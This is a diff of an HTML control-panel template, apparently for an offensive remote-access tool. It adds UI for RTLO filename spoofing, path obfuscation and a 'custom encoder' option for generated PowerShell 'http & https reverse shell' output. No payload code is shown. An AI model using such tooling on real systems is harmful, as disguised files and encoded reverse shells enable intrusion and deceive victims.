@@ -110,6 +110,47 @@
     </div>    
 </div>
     
+<div id="utilities_div" style="display:none" method="post">
+    <br><br>
+    <a class="modern_button" onclick="open_button('rtlo_div')" style="--clr:#851804" title="Right to left override" ><span>rtlo</span><i></i></a>
+    &nbsp;&nbsp;
+    <a class="modern_button" onclick="open_button('obfuscate_path_div')" style="--clr:#851804"><span>obfuscate path</span><i></i></a>
+    <div id="rtlo_div" style="display:none">
+        <br><br><br><br><br>
+        
+            <input class="input-change-password" placeholder="filename" style="height: 33px ;width: 15%;" type=text
+                id="rtlo_encode_id">&nbsp;&nbsp;
+                <input class="input-change-password" placeholder="extension" style="height: 33px ;width: 15%;" type=text
+                id="rtlo_encode_ext_id">&nbsp;&nbsp;
+                <br><br><br>
+                <a class="modern_button" onclick="rtlo()" style="--clr:#851804" title="Right to left override" ><span>encode</span><i></i></a>
+                <br><br><br><br>
+                <input class="input-change-password"  style="height: 33px ;width: 35%;" type=text
+                id="rtlo_encode_result_id">&nbsp;&nbsp;
+
+                
+    </div>
+    <div id="obfuscate_path_div" style="display:none">
+        <br><br><br><br><br>
+        <div style="display: flex;
+            justify-content: center;
+            align-items: center;">
+            <br><br><br>
+
+            <input class="input-change-password" style="height: 33px ;width: 35%;" type=text
+                id="obfuscate_path_id">&nbsp;&nbsp;
+                <a class="modern_button" onclick="click_obfuscate_path()" style="--clr:#851804" title="Right to left override" ><span>obfuscate</span><i></i></a>
+
+            <!-- <button class="cybr-btn" onclick="click_obfuscate_path()">
+                obfuscate
+                <span aria-hidden class="cybr-btn__glitch">obfuscate</span> -->
+            <!-- </button> -->
+            </div>
+    </div>
+    <br><br>
+    <br><br>
+</div>
+
 <div id="auto_command_div" style="display:none" method="post">
     <br><br>
     <a class="modern_button" onclick="open_button('auto_command_add_div')" style="--clr:#851804" ><span>add module</span><i></i></a>
@@ -211,7 +252,7 @@
             onclick="on_connection_command_add_send()">Add</button>
 
     </div>
-    <div id="open_on_connection_command_list_div" style="display:none" method="post">
+    <div id="open_on_connection_command_list_div" style="display:none;color:white" method="post">
         
         <table>
             <tr>
@@ -257,7 +298,11 @@
         <br><br><br>
     
         <a class="modern_button" onclick="generate_powershell('auto_command_div')" style="--clr:#851804" ><span>generate</span><i></i></a>
-
+        &nbsp;&nbsp;
+        <input class="form-check-input" type="checkbox" value="" id="custom_encoder_powershell_id">
+            <strong style="color:white"><label class="form-check-label" style="font-size: 140%;" for="flexCheckDefault">
+              Custom encoder
+            </label></strong>
         <br><br><br>
         <textarea id="powershell_textarea" placeholder="http & https reverse shell" class="form-control"></textarea>
 
